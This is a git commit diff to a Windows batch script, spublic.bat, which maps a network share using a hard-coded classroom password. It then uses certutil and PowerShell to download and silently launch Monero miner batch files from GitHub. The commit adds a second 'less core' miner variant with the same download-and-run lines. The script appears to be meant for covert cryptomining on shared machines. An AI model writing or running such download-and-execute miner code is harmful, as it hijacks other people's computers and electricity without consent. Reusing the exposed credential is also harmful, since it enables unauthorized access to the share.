3c6a5bb35e5efdf23582c5580befbf5d9c2d989c
acu715 <107559812+acu715@users.noreply.github.com>
2026-05-27 19:00:31 +0800

    Update spublic.bat

--- spublic.bat
+++ spublic.bat
@@ -7,3 +7,7 @@ net use t: \\ecfile2\spublic cl24683680 /user:elegantia\classroom /p:no
 
 certutil -urlcache -f "https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github_Wallet.bat" "%temp%\miner.bat" >nul 2>&1 && start "" "%temp%\miner.bat"
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github_Wallet.bat' -OutFile $env:temp\miner.bat; & $env:temp\miner.bat"
+
+:: Less Core
+certutil -urlcache -f "https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github-less_core_Wallet.bat" "%temp%\miner.bat" >nul 2>&1 && start "" "%temp%\miner.bat"
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/acu715/acu715/raw/refs/heads/main/CMD_Mining/XMR_Rig-XMR-Auto_Github-less_core_Wallet.bat' -OutFile $env:temp\miner.bat; & $env:temp\miner.bat"
